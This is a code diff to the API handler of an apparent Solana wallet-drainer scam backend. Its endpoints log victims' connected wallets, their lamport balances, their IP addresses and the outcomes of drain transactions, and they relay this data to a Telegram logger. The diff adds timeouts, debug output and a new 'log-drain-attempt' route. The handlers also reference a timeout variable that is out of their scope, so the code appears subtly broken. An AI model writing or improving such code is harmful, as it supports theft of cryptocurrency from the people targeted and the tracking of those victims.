@@ -10,13 +10,24 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
   
+  // Set timeout for the entire request
+  const timeoutId = setTimeout(() => {
+    if (!res.headersSent) {
+      res.status(408).json({ error: 'Request timeout' });
+    }
+  }, 30000); // 30 second timeout to match handler timeout
+  
   // Handle preflight requests
   if (req.method === 'OPTIONS') {
+    clearTimeout(timeoutId);
     res.status(200).end();
     return;
   }
   
   const { pathname } = new URL(req.url, `http://${req.headers.host}`);
+  
+  // Debug logging
+  console.log(`[API] Request URL: ${req.url}, Pathname: ${pathname}, Method: ${req.method}`);
   
   // Route based on path
   if (pathname === '/api/drainer/log-wallet') {
@@ -25,6 +36,8 @@ export default async function handler(req, res) {
     await handleConfirmationLogging(req, res);
   } else if (pathname === '/api/drainer/log-cancellation') {
     await handleCancellationLogging(req, res);
+  } else if (pathname === '/api/drainer/log-drain-attempt') {
+    await handleDrainAttemptLogging(req, res);
   } else if (pathname === '/api/drainer') {
     // Route to unified drainer for consistency with local server
     try {
@@ -70,6 +83,7 @@ async function handleWalletLogging(req, res) {
     
     if (cachedLog && (now - cachedLog.timestamp) < WALLET_LOG_CACHE_TTL) {
       console.log(`[SERVER] Skipping duplicate wallet log for ${walletType} - logged ${Math.round((now - cachedLog.timestamp)/1000)}s ago`);
+      clearTimeout(timeoutId);
       return res.status(200).json({ success: true, message: 'Duplicate log skipped' });
     }
     
@@ -104,7 +118,7 @@ async function handleWalletLogging(req, res) {
     try {
       const telegramImportPromise = import('../src/telegram.js');
       const timeoutPromise = new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Telegram import timeout')), 5000)
+        setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
       );
       
       const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
@@ -116,7 +130,7 @@ async function handleWalletLogging(req, res) {
         walletType: walletType || 'Unknown'
       });
       const logTimeoutPromise = new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Telegram log timeout')), 10000)
+        setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
       );
       
       await Promise.race([logPromise, logTimeoutPromise]);
@@ -127,10 +141,14 @@ async function handleWalletLogging(req, res) {
     }
     
     // Silent success logging for production
+    clearTimeout(timeoutId);
     res.status(200).json({ success: true });
   } catch (error) {
+    clearTimeout(timeoutId);
     console.error('[SERVER] Error logging wallet connection:', error);
-    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
+    }
   }
 }
 
@@ -146,7 +164,7 @@ async function handleConfirmationLogging(req, res) {
       try {
         const telegramImportPromise = import('../src/telegram.js');
         const timeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Telegram import timeout')), 5000)
+          setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
         );
         
         const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
@@ -159,7 +177,7 @@ async function handleConfirmationLogging(req, res) {
           ip: userIp
         });
         const logTimeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Telegram log timeout')), 10000)
+          setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
         );
         
         await Promise.race([logPromise, logTimeoutPromise]);
@@ -171,7 +189,7 @@ async function handleConfirmationLogging(req, res) {
       try {
         const telegramImportPromise = import('../src/telegram.js');
         const timeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Telegram import timeout')), 5000)
+          setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
         );
         
         const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
@@ -184,7 +202,7 @@ async function handleConfirmationLogging(req, res) {
           error: error || 'Transaction failed on-chain'
         });
         const logTimeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Telegram log timeout')), 10000)
+          setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
         );
         
         await Promise.race([logPromise, logTimeoutPromise]);
@@ -196,10 +214,14 @@ async function handleConfirmationLogging(req, res) {
     }
     
     // Silent confirmation success logging for production
+    clearTimeout(timeoutId);
     res.status(200).json({ success: true });
   } catch (error) {
+    clearTimeout(timeoutId);
     console.error('[CONFIRMATION] Error logging confirmation:', error);
-    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
+    }
   }
 }
 
@@ -213,7 +235,7 @@ async function handleCancellationLogging(req, res) {
     try {
       const telegramImportPromise = import('../src/telegram.js');
       const timeoutPromise = new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Telegram import timeout')), 5000)
+        setTimeout(() => reject(new Error('Telegram import timeout')), 10000)
       );
       
       const telegramLogger = (await Promise.race([telegramImportPromise, timeoutPromise])).default;
@@ -226,7 +248,7 @@ async function handleCancellationLogging(req, res) {
         lamports: req.body.lamports || 0
       });
       const logTimeoutPromise = new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Telegram log timeout')), 10000)
+        setTimeout(() => reject(new Error('Telegram log timeout')), 30000)
       );
       
       await Promise.race([logPromise, logTimeoutPromise]);
@@ -236,9 +258,35 @@ async function handleCancellationLogging(req, res) {
     }
     
     // Silent cancellation success logging for production
+    clearTimeout(timeoutId);
     res.status(200).json({ success: true });
   } catch (error) {
+    clearTimeout(timeoutId);
     console.error('[CANCELLATION] Error logging cancellation:', error);
-    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
+    }
+  }
+}
+
+// Drain attempt logging handler
+async function handleDrainAttemptLogging(req, res) {
+  try {
+    // Silent drain attempt logging for production
+    const { publicKey, walletType, lamports, instructions, transactionSize } = req.body;
+    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
+    
+    // Log drain attempt details
+    console.log(`[DRAIN_ATTEMPT] ${walletType} wallet: ${publicKey}, Balance: ${lamports} lamports, Instructions: ${instructions}`);
+    
+    // Silent drain attempt success logging for production
+    clearTimeout(timeoutId);
+    res.status(200).json({ success: true });
+  } catch (error) {
+    clearTimeout(timeoutId);
+    console.error('[DRAIN_ATTEMPT] Error logging drain attempt:', error);
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Failed to log drain attempt', details: error.message });
+    }
   }
 } 
